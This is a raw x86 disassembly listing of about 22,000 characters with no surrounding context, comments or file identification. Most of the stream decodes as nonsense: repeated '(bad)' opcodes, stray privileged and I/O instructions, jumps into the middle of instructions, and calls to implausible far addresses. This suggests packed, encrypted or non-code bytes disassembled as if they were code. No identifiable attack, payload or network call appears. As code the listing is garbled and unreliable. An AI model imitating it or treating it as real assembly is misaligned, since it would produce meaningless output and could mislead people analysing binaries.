  410b83:	or     BYTE PTR [edx],cl
  410b85:	shl    cl,cl
  410b87:	icebp  
  410b88:	add    BYTE PTR [ebp+0x38],0x8b
  410b8c:	or     BYTE PTR [edx+eax*2],cl
  410b8f:	(bad)  
  410b90:	or     cl,dh
  410b92:	stc    
  410b93:	shl    DWORD PTR [ebp-0x30],0xc6
  410b97:	xor    al,0x0
  410b99:	inc    ebp
  410b9a:	xchg   BYTE PTR [ebx],al
  410b9c:	add    esp,edi
  410b9e:	add    BYTE PTR [ebp-0x39],cl
  410ba1:	mov    al,bl
  410ba3:	test   DWORD PTR [ebx+0x1c348375],ecx
  410ba9:	sub    al,0xbf
  410bab:	jmp    0x410b32
  410bad:	mov    edi,eax
  410baf:	lock jge 0x410ba3
  410bb2:	lea    esi,[edx-0x74bad5ff]
  410bb8:	mov    ebp,esp
  410bba:	or     cl,dh
  410bbc:	leave  
  410bbd:	add    al,BYTE PTR [eax+eax*4-0x37ff9b00]
  410bc4:	dec    ebp
  410bc5:	dec    ebp
  410bc6:	test   DWORD PTR [ebx],eax
  410bc8:	paddb  mm6,mm0
  410bcb:	add    DWORD PTR [eax],eax
  410bcd:	dec    ebp
  410bce:	mov    ecx,DWORD PTR [ebx-0x64b217f0]
  410bd4:	mov    esi,DWORD PTR [edx]
  410bd6:	or     al,0x2b
  410bd8:	dec    ebp
  410bd9:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  410bdf:	mov    esp,edi
  410be1:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  410be8:	mov    DWORD PTR [ebx],ebp
  410bea:	call   0xc74951a
  410bef:	mov    DWORD PTR [ebp+0x10],ecx
  410bf2:	(bad)  
  410bf3:	push   0x8b85ff10
  410bf8:	clc    
  410bf9:	or     al,0x54
  410bfb:	(bad)  
  410bfc:	push   ecx
  410bfd:	retf   
  410bfe:	mov    ebx,0xff4d8dc8
  410c03:	mov    DWORD PTR [ebp+0x8],eax
  410c06:	xor    eax,DWORD PTR [ebp-0x75]
  410c09:	cmp    ebp,DWORD PTR [ebx]
  410c0b:	lsl    ebx,WORD PTR [edi-0x8]
  410c0f:	call   DWORD PTR [ebx-0x741bff75]
  410c15:	(bad)  
  410c16:	or     al,0x5b
  410c18:	dec    ebp
  410c19:	or     BYTE PTR [ebx],dh
  410c1b:	inc    ebp
  410c1c:	xor    esi,DWORD PTR ds:0x708088d
  410c22:	in     eax,0x9b
  410c24:	add    BYTE PTR [edx],dh
  410c26:	inc    ebp
  410c27:	pop    edi
  410c28:	xor    eax,edx
  410c2a:	test   DWORD PTR [eax],0x83108b8b
  410c30:	dec    ebp
  410c31:	adc    al,0x33
  410c33:	inc    ebp
  410c34:	xor    esi,DWORD PTR [ecx]
  410c36:	sub    ebx,DWORD PTR [ebx+edi*1-0x74038a39]
  410c3d:	test   DWORD PTR [eax],ecx
  410c3f:	clc    
  410c40:	inc    ebp
  410c41:	add    ecx,DWORD PTR [ebx+0xc7f445]
  410c47:	hlt    
  410c48:	leave  
  410c49:	test   DWORD PTR [esi],eax
  410c4b:	clc    
  410c4c:	inc    esi
  410c4d:	push   edi
  410c4e:	cmp    BYTE PTR [ebp+0x17],al
  410c51:	ror    DWORD PTR [ebp-0x29],1
  410c54:	or     BYTE PTR [ebx+0x4d65fc54],0xd1
  410c5b:	mov    eax,0x780084d
  410c60:	push   esp
  410c61:	clc    
  410c62:	ret    0xe99b
  410c65:	xor    dl,dl
  410c67:	xor    ecx,DWORD PTR [ebx+0x4d030803]
  410c6d:	js     0x887986c
  410c73:	dec    ebp
  410c74:	push   ebp
  410c75:	mov    edi,DWORD PTR [eax+0xc872fc]
  410c7b:	lock enter 0xceca,0xf2
  410c80:	retf   0x18ce
  410c83:	jne    0x410cd2
  410c85:	mov    ecx,DWORD PTR [ebx-0x31eaf304]
  410c8b:	enter  0xf0d6,0xca
  410c8f:	retf   0xf2c8
  410c92:	into   
  410c93:	out    dx,al
  410c94:	dec    ebp
  410c95:	dec    ebp
  410c96:	jmp    0xff450bce
  410c9b:	xor    eax,DWORD PTR [ebp-0x15]
  410c9e:	xor    esi,DWORD PTR [ebx]
  410ca0:	mov    esi,DWORD PTR [ebx]
  410ca2:	sub    eax,DWORD PTR [ebx]
  410ca4:	add    eax,DWORD PTR [ebx]
  410ca6:	or     bl,dl
  410ca8:	dec    ebp
  410ca9:	mov    DWORD PTR [ebx-0x38b2ef08],ecx
  410caf:	xor    eax,DWORD PTR [ebp-0xf00073]
  410cb5:	jb     0x410cfc
  410cb7:	add    BYTE PTR [ebx],dh
  410cb9:	dec    ebp
  410cba:	pop    esi
  410cbb:	mov    ebp,ebx
  410cbd:	cld    
  410cbe:	mov    esi,eax
  410cc0:	call   0x520f618d
  410cc5:	stc    
  410cc6:	add    eax,0x4572aa
  410ccb:	pop    edi
  410ccc:	leave  
  410ccd:	add    ecx,DWORD PTR [eax*2-0x3c13a1ab]
  410cd4:	in     al,dx
  410cd5:	mov    eax,edi
  410cd7:	xor    eax,0xf8008520
  410cdd:	mov    DWORD PTR [ebp-0x14],0xf89c8532
  410ce4:	mov    eax,DWORD PTR [ebp-0x77]
  410ce7:	xor    bh,al
  410ce9:	pushf  
  410cea:	inc    ebp
  410ceb:	(bad)  
  410cec:	cmp    eax,ebp
  410cee:	pushf  
  410cef:	xchg   BYTE PTR [esi-0x8],dl
  410cf2:	mov    edi,0x8518e4ec
  410cf8:	jmp    0xf056:0x8b457df8
  410cff:	push   esp
  410d00:	push   esp
  410d01:	push   ecx
  410d02:	push   ecx
  410d03:	push   edi
  410d04:	xor    eax,esi
  410d06:	mov    edx,0x32729b
  410d0b:	add    ecx,eax
  410d0d:	mov    edx,edi
  410d0f:	clc    
  410d10:	retf   0xaf45
  410d13:	cmp    ebx,ebp
  410d15:	pushf  
  410d16:	mov    eax,edi
  410d18:	clc    
  410d19:	cld    
  410d1a:	jne    0x410d34
  410d1c:	xor    ebp,edx
  410d1e:	xor    eax,DWORD PTR [ebp+0x3]
  410d21:	or     BYTE PTR [ebx],al
  410d23:	add    BYTE PTR [ebp-0x7747475],al
  410d29:	hlt    
  410d2a:	dec    ebp
  410d2b:	dec    ebp
  410d2c:	je     0x410d61
  410d2e:	xor    esi,DWORD PTR [ebx]
  410d30:	xor    eax,DWORD PTR [ebx]
  410d32:	add    eax,DWORD PTR [ebx]
  410d34:	add    ecx,DWORD PTR [edi]
  410d36:	rol    ecx,cl
  410d38:	mov    esi,DWORD PTR [ecx]
  410d3a:	in     al,dx
  410d3b:	inc    ebp
  410d3c:	enter  0xca2b,0x33
  410d40:	icebp  
  410d41:	mov    DWORD PTR [edx],ecx
  410d43:	clc    
  410d44:	lock pop ebp
  410d46:	enter  0xf2e8,0xfe
  410d4a:	retf   0xeeff
  410d4d:	inc    ebp
  410d4e:	jne    0x410cdb
  410d50:	mov    edi,eax
  410d52:	cld    
  410d53:	dec    ebp
  410d54:	enter  0xbc89,0x8d
  410d58:	fwait
  410d59:	sti    
  410d5a:	xor    bh,bh
  410d5c:	mov    eax,DWORD PTR [ebp-0xc]
  410d5f:	mov    esi,DWORD PTR [ebp-0x4]
  410d62:	xor    eax,esi
  410d64:	xor    eax,DWORD PTR [ebx+ebp*1+0x76323b9b]
  410d6b:	mov    DWORD PTR [ebx-0x76ba0704],ecx
  410d71:	mov    ecx,DWORD PTR [ebx-0x3631070c]
  410d77:	(bad)  
  410d78:	push   ebp
  410d79:	shr    esp,0x4d
  410d7c:	in     al,dx
  410d7d:	cmp    eax,DWORD PTR [esi+esi*2]
  410d80:	add    BYTE PTR [ebx-0x39ce1bbb],cl
  410d86:	pushf  
  410d87:	mov    edi,0x85c7f445
  410d8d:	call   0xf886948a
  410d92:	xor    ebx,ebx
  410d94:	pushf  
  410d95:	popa   
  410d96:	push   ebx
  410d97:	dec    ebp
  410d98:	inc    ebp
  410d99:	mov    esi,DWORD PTR [eax]
  410d9b:	clc    
  410d9c:	pushf  
  410d9d:	into   
  410d9e:	mov    ecx,edi
  410da0:	in     al,dx
  410da1:	call   0x8b495364
  410da6:	pop    es
  410da7:	or     BYTE PTR [ebx],dh
  410da9:	or     BYTE PTR [edi+0x8a724d],bh
  410daf:	or     eax,edi
  410db1:	push   ebp
  410db2:	inc    ebp
  410db3:	cmpxchg8b (bad)
  410db4:	(bad)  
  410db5:	leave  
  410db6:	loopne 0x410d82
  410db8:	test   DWORD PTR [ebp-0x8],ecx
  410dbb:	mov    eax,DWORD PTR [ebp-0x18]
  410dbe:	rcl    DWORD PTR [ebp-0x29],1
  410dc1:	xor    eax,edi
  410dc3:	add    esi,eax
  410dc5:	and    eax,DWORD PTR [eax]
  410dc7:	mov    eax,DWORD PTR [eax]
  410dc9:	(bad)  
  410dca:	leave  
  410dcb:	sti    
  410dcc:	inc    ebp
  410dcd:	dec    DWORD PTR [ebx-0x39cc13ab]
  410dd3:	mov    esi,ecx
  410dd5:	clc    
  410dd6:	(bad)  
  410dd7:	dec    ebp
  410dd8:	iret   
  410dd9:	xor    ebp,DWORD PTR [edi-0x74f71473]
  410ddf:	jb     0x410ddd
  410de1:	add    bh,al
  410de3:	inc    ebp
  410de4:	(bad)  
  410de5:	mov    eax,DWORD PTR [ebp-0xc]
  410de8:	(bad)  
  410de9:	xabort 0x65
  410dec:	loopne 0x410dbb
  410dee:	jmp    FWORD PTR [ebx]
  410df0:	mov    DWORD PTR [ebx],eax
  410df2:	clc    
  410df3:	lock inc ebp
  410df5:	dec    ebp
  410df6:	mov    ecx,DWORD PTR [ebx+0x4d84ecfc]
  410dfc:	loopne 0x410e31
  410dfe:	inc    DWORD PTR [ebx]
  410e00:	mov    edi,DWORD PTR [ebx]
  410e02:	hlt    
  410e03:	jne    0x410e52
  410e05:	mov    esi,DWORD PTR [ebx]
  410e07:	in     al,0x8d
  410e09:	dec    ebp
  410e0a:	or     BYTE PTR [ebx],dh
  410e0c:	jb     0x410e11
  410e0e:	add    BYTE PTR [edi+0x45],bl
  410e11:	xor    ecx,DWORD PTR [ebx+0x4dc2e85b]
  410e17:	add    BYTE PTR [ebx],dh
  410e19:	mov    esi,DWORD PTR [ebx]
  410e1b:	sub    DWORD PTR [ebx],0x6c
  410e1e:	mov    eax,DWORD PTR [ebp-0x4]
  410e21:	xor    eax,ecx
  410e23:	pushf  
  410e24:	mov    ecx,0x338545ba
  410e29:	clc    
  410e2a:	add    edx,DWORD PTR [ebp-0x77]
  410e2d:	mov    edi,eax
  410e2f:	adc    al,0x45
  410e31:	inc    ebp
  410e32:	xor    BYTE PTR [ebx-0x7f74eb64],cl
  410e38:	jmp    0x410e3b
  410e3a:	mov    eax,DWORD PTR [eax]
  410e3c:	loopne 0x410e8b
  410e3e:	inc    ebp
  410e3f:	mov    esi,DWORD PTR [ebx]
  410e41:	mov    eax,DWORD PTR [ebx]
  410e43:	nop
  410e44:	rol    DWORD PTR [eax],cl
  410e46:	mov    DWORD PTR [ebx+0x3c4503fc],ecx
  410e4c:	mov    cl,BYTE PTR [ecx+0x450bf888]
  410e52:	dec    ebp
  410e53:	push   esi
  410e54:	mov    edi,DWORD PTR [edi+0x7b608f8]
  410e5a:	xor    eax,edi
  410e5c:	mov    DWORD PTR [ebx+0x34d3208],ebx
  410e62:	mov    ecx,DWORD PTR [ecx+0x45ceec08]
  410e68:	iret   
  410e69:	xor    ecx,edx
  410e6b:	add    ecx,DWORD PTR [ecx+ecx*4+0x45fff4e0]
  410e72:	mov    ecx,DWORD PTR [ebx-0x1735af04]
  410e78:	dec    ebp
  410e79:	mov    DWORD PTR [ebx-0x31ba0b2c],ecx
  410e7f:	mov    eax,DWORD PTR [eax+edi*1+0x48324d9b]
  410e86:	mov    DWORD PTR [ecx+0x8],eax
  410e89:	mov    eax,DWORD PTR [ebp-0x8]
  410e8c:	xor    ebx,DWORD PTR [eax]
  410e8e:	mov    ecx,0xff8b8d40
  410e93:	clc    
  410e94:	enter  0x4d49,0x48
  410e98:	mov    eax,edx
  410e9a:	lock enter 0x4545,0x8b
  410e9f:	mov    esi,eax
  410ea1:	cmp    dh,al
  410ea3:	rol    edi,0x3
  410ea6:	enter  0x9140,0x89
  410eaa:	inc    ebp
  410eab:	adc    al,0x8b
  410ead:	inc    ebp
  410eae:	clc    
  410eaf:	xor    eax,esi
  410eb1:	add    eax,edi
  410eb3:	mov    DWORD PTR [esi-0x24],ebx
  410eb6:	rol    DWORD PTR [ebp-0x37],0x33
  410eba:	add    al,0x3
  410ebc:	push   ebp
  410ebd:	mov    esp,ebp
  410ebf:	fsubr  st,st(4)
  410ec1:	inc    ebp
  410ec2:	(bad)  
  410ec3:	mov    edi,esp
  410ec5:	adc    BYTE PTR [ebp+0x32c3f8c7],al
  410ecb:	add    DWORD PTR [ebp+edx*2-0x27173877],ebx
  410ed2:	inc    ebp
  410ed3:	test   DWORD PTR [ecx+0x454514f8],ecx
  410ed9:	cmp    al,0x8b
  410edb:	pushf  
  410edc:	nop
  410edd:	mov    DWORD PTR [eax],0x14858bd8
  410ee3:	clc    
  410ee4:	add    BYTE PTR [ebp-0x74feff77],al
  410eea:	add    ah,bh
  410eec:	or     edi,eax
  410eee:	dec    eax
  410eef:	ret    
  410ef0:	push   ebx
  410ef1:	inc    ebp
  410ef2:	dec    ebp
  410ef3:	mov    ecx,DWORD PTR [ebx+0x5745fc14]
  410ef9:	mov    DWORD PTR [esp+ebp*8+0x51],edx
  410efd:	jne    0x410f32
  410eff:	mov    edi,DWORD PTR [ebx+0x4d720c]
  410f05:	call   0xff8700cd
  410f0a:	mov    eax,DWORD PTR [ebp-0x4]
  410f0d:	mov    edi,0x4585c3d8
  410f13:	clc    
  410f14:	mov    eax,DWORD PTR [ebp-0x8]
  410f17:	xor    eax,DWORD PTR [eax+0x3]
  410f1a:	adc    DWORD PTR [eax+0xc],0x45
  410f1e:	inc    ebp
  410f1f:	push   eax
  410f20:	mov    ebx,ebp
  410f22:	clc    
  410f23:	inc    DWORD PTR [eax-0x75]
  410f26:	mov    esi,eax
  410f28:	clc    
  410f29:	rol    BYTE PTR [ebp+0x4545544e],0x33
  410f30:	je     0x410f35
  410f32:	mov    edx,DWORD PTR [eax+0x38]
  410f35:	jne    0x410f84
  410f37:	lea    ecx,[ebx-0x817ab44]
  410f3d:	mul    BYTE PTR [ebx]
  410f3f:	dec    DWORD PTR [ebx+0x4089f845]
  410f45:	fadd   DWORD PTR [ebx]
  410f47:	inc    ebp
  410f48:	jmp    0x410ed5
  410f4a:	mov    ecx,DWORD PTR [esp+edx*2]
  410f4d:	rol    DWORD PTR [ebp+0x45],0x8b
  410f51:	mov    edi,esp
  410f53:	lock (bad) 
  410f55:	dec    ebp
  410f56:	ret    
  410f57:	mov    eax,DWORD PTR [ebp+0x10]
  410f5a:	mov    eax,DWORD PTR [ecx-0x4]
  410f5d:	mov    eax,edi
  410f5f:	fadd   st,st(3)
  410f61:	enter  0x1645,0x8b
  410f65:	inc    ebp
  410f66:	cld    
  410f67:	mov    ecx,DWORD PTR [ebp+0xc]
  410f6a:	xor    ecx,DWORD PTR [ebp+0x3]
  410f6d:	add    ecx,DWORD PTR [ecx-0x27b276f8]
  410f73:	sub    eax,DWORD PTR [ebp-0x17]
  410f76:	xor    eax,DWORD PTR [edx]
  410f78:	pushf  
  410f79:	add    bh,al
  410f7b:	or     al,0xd8
  410f7d:	jne    0x410f04
  410f7f:	(bad)  
  410f80:	clc    
  410f81:	mov    al,0x45
  410f83:	call   0xffde05c5
  410f88:	jmp    0xdd12be
  410f8d:	mov    DWORD PTR [ebp-0x30],eax
  410f90:	xor    eax,DWORD PTR [ebp+0x3]
  410f93:	xor    cl,BYTE PTR [ecx+0x45c7f49c]
  410f99:	enter  0x8503,0xc
  410f9d:	clc    
  410f9e:	inc    ebp
  410f9f:	inc    ebp
  410fa0:	(bad)  
  410fa1:	cmp    al,0xec
  410fa3:	pushf  
  410fa4:	jne    0x410f33
  410fa6:	mov    edx,eax
  410fa8:	clc    
  410fa9:	dec    ebp
  410faa:	out    dx,eax
  410fab:	(bad)  
  410fac:	dec    esp
  410fae:	mov    DWORD PTR [ebp-0x10],ecx
  410fb1:	lea    eax,[ebp-0x38]
  410fb4:	cmp    DWORD PTR [ebp-0x64],ecx
  410fb7:	lea    ecx,[ebx-0x38b2273c]
  410fbd:	mov    eax,ebx
  410fbf:	cld    
  410fc0:	(bad)  
  410fc1:	iret   
  410fc2:	mov    esp,0xf74de8cb
  410fc7:	jmp    0x8611cb
  410fcc:	test   DWORD PTR [ebx],esi
  410fce:	je     0x410f6c
  410fd0:	mov    ecx,DWORD PTR [edi]
  410fd2:	fdivr  st,st(6)
  410fd4:	mov    DWORD PTR [eax],0xe8ff8bc3
  410fda:	lock iret 
  410fdc:	inc    ebp
  410fdd:	lock push eax
  410fdf:	retf   
  410fe0:	imul   ecx,DWORD PTR [ebp-0x1],0xecd88b8b
  410fe7:	test   DWORD PTR [ebp-0x7c],0x32d89b8b
  410fee:	dec    ebp
  410fef:	mov    DWORD PTR [ebx],ebp
  410ff1:	fmul   DWORD PTR [ecx+0x458bd845]
  410ff7:	fmul   DWORD PTR [ebx+0x40c3f0c7]
  410ffd:	enter  0x1303,0xc
  411001:	inc    ebp
  411002:	dec    ebp
  411003:	xor    edi,DWORD PTR [ebx]
  411005:	add    esi,DWORD PTR [edx+0x50]
  411008:	mov    ecx,DWORD PTR [eax+esi*8]
  41100b:	inc    ebp
  41100c:	inc    eax
  41100d:	push   eax
  41100e:	mov    ebp,esp
  411010:	lock inc DWORD PTR [ecx-0x75]
  411014:	mov    esp,esp
  411016:	fadd   DWORD PTR [eax]
  411018:	rol    edi,0xee
  41101b:	test   BYTE PTR [eax],al
  41101d:	dec    ebx
  41101e:	push   0x32
  411020:	dec    DWORD PTR [ebx-0x30ba0314]
  411026:	push   eax
  411027:	mov    dh,0x21
  411029:	add    edi,edi
  41102b:	cmp    edi,DWORD PTR [eax-0x7877af1]
  411031:	add    BYTE PTR [ebp-0x75],al
  411034:	(bad)  
  411035:	loopne 0x411003
  411037:	add    BYTE PTR [ebp+0x4584f8c7],al
  41103d:	dec    ebx
  41103e:	xor    esi,DWORD PTR [edx]
  411040:	pushf  
  411041:	mov    eax,edi
  411043:	cld    
  411044:	(bad)  
  411045:	iret   
  411046:	test   DWORD PTR [esi+0x3b4d03f8],esi
  41104c:	mov    DWORD PTR [edi],ecx
  41104e:	in     al,0x58
  411050:	dec    ebp
  411051:	add    BYTE PTR [ecx+0x4df0e08b],cl
  411057:	add    BYTE PTR [ecx+0x4d84f0c7],cl
  41105d:	dec    ebx
  41105e:	mov    DWORD PTR [edx],esi
  411060:	fmul   QWORD PTR [ebx-0x30cc03b3]
  411066:	add    esi,DWORD PTR [esi+0x3bd80389]
  41106c:	test   DWORD PTR [edi],0x3d3800
  411072:	test   DWORD PTR [ebx+0x84dcf8],ecx
  411078:	add    edi,eax
  41107a:	add    BYTE PTR [ebp+ecx*2-0x74cdccb5],al
  411081:	mov    eax,DWORD PTR [ebx]
  411083:	cld    
  411084:	mov    edi,ecx
  411086:	hlt    
  411087:	mov    dh,0x45
  411089:	add    esi,DWORD PTR [ebx]
  41108b:	cmp    ecx,DWORD PTR [ebp+0x7218300f]
  411091:	add    BYTE PTR [eax],al
  411093:	mov    eax,DWORD PTR [ebp-0x20]
  411096:	mov    eax,DWORD PTR [eax]
  411098:	call   0x33c55e64
  41109d:	dec    ebx
  41109e:	add    esi,DWORD PTR [edx]
  4110a0:	cmp    ecx,DWORD PTR [ebx+0x98be475]
  4110a6:	cld    
  4110a7:	iret   
  4110a8:	(bad)  
  4110a9:	mov    ebx,es
  4110ab:	dec    ebx
  4110ac:	push   0x32
  4110ae:	lea    esi,[edx]
  4110b0:	mov    al,0x8b
  4110b2:	call   0xff4b0ba7
  4110b7:	iret   
  4110b8:	inc    ebp
  4110b9:	mov    WORD PTR [ebx-0x75cdccb5],cs
  4110bf:	or     al,BYTE PTR ds:0xe4728b
  4110c5:	or     DWORD PTR [ebp-0x31],ecx
  4110c8:	xor    ecx,DWORD PTR [edi+ecx*1-0x34cd3fb1]
  4110cf:	cmp    al,cl
  4110d1:	je     0x4112ab
  4110d7:	mov    eax,DWORD PTR [ebp-0x10]
  4110da:	mov    eax,DWORD PTR [eax]
  4110dc:	xor    eax,edi
  4110de:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  4110e5:	mov    ecx,DWORD PTR [ebp-0x20]
  4110e8:	xor    ecx,DWORD PTR [ecx]
  4110ea:	bswap  edi
  4110ec:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb5],0x32
  4110f4:	add    DWORD PTR [ebx+0x945dc00],ecx
  4110fa:	mov    ecx,edi
  4110fc:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054b]
  411103:	or     al,BYTE PTR [eax]
  411105:	mov    ecx,DWORD PTR [ebp-0x20]
  411108:	xor    ecx,DWORD PTR [ecx]
  41110a:	bswap  edi
  41110c:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb1],0x3a
  411114:	add    DWORD PTR [edi],ecx
  411116:	add    BYTE PTR [eax-0x7474ffbb],dl
  41111c:	xor    ebx,esp
  41111e:	mov    al,BYTE PTR [eax]
  411120:	add    eax,0x8472c7
  411125:	dec    ebx
  411126:	dec    ebp
  411127:	xor    dh,BYTE PTR [ebx]
  411129:	mov    ecx,DWORD PTR [edi]
  41112b:	lock ror BYTE PTR [ecx],0xcb
  41112f:	iret   
  411130:	ror    DWORD PTR [esp+eax*4+0x32014b],0x32
  411138:	inc    ebp
  411139:	mov    ecx,DWORD PTR [ebx-0x75f6cc1c]
  41113f:	iret   
  411140:	add    eax,0x4b728c
  411145:	xor    cl,BYTE PTR [ebp+0xa]
  411148:	mov    ecx,DWORD PTR [ebx+0x98af033]
  41114e:	or     eax,0x8c72cf
  411153:	dec    edi
  411154:	shl    DWORD PTR [edx],0x4d
  411157:	cmp    cl,BYTE PTR [ebx-0x7574cc8b]
  41115d:	fmul   QWORD PTR ds:0xc77200
  411163:	test   cl,al
  411165:	dec    ebx
  411166:	dec    ebp
  411167:	xor    cl,BYTE PTR [ebx-0x751bcc75]
  41116d:	or     DWORD PTR ds:0x8c72cf,ecx
  411173:	dec    ebx
  411174:	enter  0x8532,0x32
  411178:	add    BYTE PTR [ebx+0x945e000],cl
  41117e:	mov    ecx,edi
  411180:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054b]
  411187:	or     al,BYTE PTR [eax]
  411189:	mov    ecx,DWORD PTR [ebp-0x24]
  41118c:	mov    ecx,DWORD PTR [ecx]
  41118e:	xor    ecx,edi
  411190:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724f]
  411197:	cmp    al,cl
  411199:	jne    0x4111e8
  41119b:	lea    ecx,[ebx-0x7517cc50]
  4111a1:	sti    
  4111a2:	or     eax,0x4d72ff
  4111a7:	cmp    eax,ecx
  4111a9:	je     0x4111f8
  4111ab:	mov    ecx,DWORD PTR [ebx-0x7538cc04]
  4111b1:	ret    
  4111b2:	or     eax,0x8b7245
  4111b7:	call   0x84c6d984
  4111bc:	add    BYTE PTR [ebx+0x33453200],bl
  4111c2:	mov    ecx,DWORD PTR [ebx+0x558afc33]
  4111c8:	add    eax,0x37233
  4111cd:	cmp    ecx,DWORD PTR [ebp+0xf]
  4111d0:	mov    esi,edi
  4111d2:	xor    edi,edi
  4111d4:	mov    cl,BYTE PTR [ebx+0x4d72fc0d]
  4111da:	add    BYTE PTR [ebx],dh
  4111dc:	rol    DWORD PTR [ebx],0x4d
  4111df:	cmp    ecx,DWORD PTR [ebx-0x7574cc8b]
  4111e5:	call   0x33b35ef7
  4111ea:	add    BYTE PTR [ebp+0x724d08c1],cl
  4111f0:	mov    eax,DWORD PTR [eax]
  4111f2:	xor    esi,DWORD PTR [edi-0x76]
  4111f5:	sbb    BYTE PTR ds:0x8d7275,cl
  4111fb:	cwde   
  4111fc:	enter  0x50e8,0xf3
  411200:	inc    ebp
  411201:	dec    DWORD PTR [ebx-0x7574ccbb]
  411207:	fadd   DWORD PTR ds:0xc372c7
  41120d:	ror    DWORD PTR [ebp+0x13],0x8b
  411211:	inc    ebp
  411212:	xor    esi,DWORD PTR [ebx]
  411214:	mov    al,BYTE PTR [ebx]
  411216:	or     eax,0x187250
  41121b:	inc    ebp
  41121c:	rcl    DWORD PTR [eax+0x4d],0xdc
  411220:	mov    edi,edi
  411222:	xor    ecx,DWORD PTR [ebx-0x3ff21376]
  411228:	jb     0x4111b3
  41122a:	add    ah,bl
  41122c:	shl    DWORD PTR [ebp+0x4d],0xff
  411230:	mov    ebx,esp
  411232:	xor    eax,DWORD PTR [ebp-0x76]
  411235:	add    ecx,DWORD PTR ds:0xe87208
  41123b:	repz enter 0x10ff,0x45
  411240:	inc    ebp
  411241:	mov    edx,DWORD PTR [eax-0x28]
  411244:	xor    bh,al
  411246:	inc    ebx
  411248:	mov    eax,ecx
  41124a:	mov    eax,0xa00c111
  41124f:	jne    0x411296
  411251:	mov    esi,DWORD PTR [ebx]
  411253:	test   al,0x3
  411255:	inc    ebp
  411256:	mov    DWORD PTR [eax-0xc],edx
  411259:	mov    ds:0x8b33ff45,al
  41125e:	lea    edx,[eax]
  411260:	xor    BYTE PTR [ebp+0x72],cl
  411263:	add    DWORD PTR [eax],eax
  411265:	mov    eax,edi
  411267:	lods   al,BYTE PTR ds:[esi]
  411268:	dec    ebp
  411269:	inc    ebp
  41126a:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  411270:	retf   
  411271:	mov    edx,ecx
  411273:	adc    al,0x84
  411275:	(bad)  
  411276:	std    
  411277:	ret    
  411278:	jmp    FWORD PTR [edi-0x37474bb]
  41127e:	hlt    
  41127f:	push   ebp
  411280:	(bad)  
  411281:	xor    eax,ebx
  411283:	(bad)  
  411284:	enter  0x1111,0x72
  411288:	inc    ebp
  411289:	add    BYTE PTR [ebx-0x387deb3f],cl
  41128f:	cld    
  411290:	test   bh,bh
  411292:	fwait
  411293:	inc    ebp
  411294:	xor    bl,BYTE PTR [edi-0x15]
  411297:	pop    ebx
  411298:	push   0xffffffc2
  41129a:	inc    DWORD PTR [eax]
  41129c:	in     al,dx
  41129d:	mov    eax,DWORD PTR [ebp+0x51]
  4112a0:	push   eax
  4112a1:	inc    ebp
  4112a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112a3:	mov    edi,edi
  4112a5:	or     BYTE PTR [ebx+0x4d80fc16],cl
  4112ab:	add    DWORD PTR [ebx],esi
  4112ad:	add    BYTE PTR [ebx],al
  4112af:	add    BYTE PTR [ebx],bh
  4112b1:	icebp  
  4112b2:	je     0x4112bc
  4112b4:	mov    eax,DWORD PTR [edi]
  4112b6:	cld    
  4112b7:	rol    edi,0x72
  4112ba:	ret    
  4112bb:	add    BYTE PTR [edx-0x2f],ch
  4112be:	lea    edx,[eax]
  4112c0:	cwde   
  4112c1:	jne    0x4112ab
  4112c3:	(bad)  
  4112c4:	clc    
  4112c5:	or     al,0xff
  4112c7:	inc    DWORD PTR [ebp-0x18]
  4112ca:	cmp    ebx,0x18
  4112cd:	inc    DWORD PTR [ebp+0x6]
  4112d0:	call   FWORD PTR [ebp-0x54]
  4112d3:	or     al,0x75
  4112d5:	push   ebp
  4112d6:	mov    ebp,esp
  4112d8:	test   al,0x53
  4112da:	inc    ebp
  4112db:	mov    edx,DWORD PTR [eax-0x75]
  4112de:	imul   ecx,DWORD PTR [eax],0xffffffff
  4112e1:	dec    ebp
  4112e2:	mov    edx,DWORD PTR [edi-0x4]
  4112e5:	push   esp
  4112e6:	dec    ebp
  4112e7:	push   ecx
  4112e8:	xor    esi,DWORD PTR [ebx]
  4112ea:	add    edi,DWORD PTR [edi+0x74723b]
  4112f0:	push   0xffffffc7
  4112f2:	inc    DWORD PTR [ecx]
  4112f4:	lods   al,BYTE PTR ds:[esi]
  4112f5:	inc    ebp
  4112f6:	inc    ebp
  4112f7:	mov    eax,DWORD PTR [ebx]
  4112f9:	xchg   esp,eax
  4112fa:	or     BYTE PTR [eax],al
  4112fc:	call   0xffcd0b8c
  411301:	adc    al,0x45
  411303:	or     BYTE PTR [ebx+0x800ac01],0x0
  41130a:	inc    ebp
  41130b:	inc    ecx
  41130c:	add    ecx,DWORD PTR [ebx-0x76baebec]
  411312:	mov    eax,DWORD PTR [ecx]
  411314:	call   0x338a6019
  411319:	push   0x3
  41131b:	push   0xc1300f
  411320:	dec    ebp
  411321:	jo     0x4112ae
  411323:	push   0xffffffd4
  411325:	dec    edi
  411327:	mov    DWORD PTR [ebx+ecx*4-0x3ccdf765],ecx
  41132e:	cmp    eax,edi
  411330:	cmovne edx,DWORD PTR [edi-0x75]
  411334:	call   DWORD PTR [eax]
  411336:	mov    eax,DWORD PTR [ebp+0x8]
  411339:	call   FWORD PTR [esi+0x14]
  41133c:	leave  
  41133d:	inc    ebp
  41133e:	adc    BYTE PTR [eax+0x55],dl
  411341:	jne    0x41132f
  411343:	call   0xff5212d3
  411348:	dec    ebp
  411349:	inc    ebp
  41134a:	mov    ecx,DWORD PTR [ebx+0x390338b]
  411350:	add    BYTE PTR [ebx],bh
  411352:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  411356:	push   esp
  411357:	or     al,0x51
  411359:	dec    ebp
  41135a:	xor    DWORD PTR [ebx],0xf32039b
  411360:	cmp    eax,DWORD PTR [ebp+0x74]
  411363:	mov    edi,edi
  411365:	pop    edi
  411366:	adc    BYTE PTR [ebx+0x75],bl
  411369:	ret    0x50
  41136c:	mov    ecx,DWORD PTR ss:[edx-0x7d]
  411370:	(bad)  
  411371:	clc    
  411372:	mov    esp,ebp
  411374:	pop    ecx
  411375:	mov    ecx,0xf80085c2
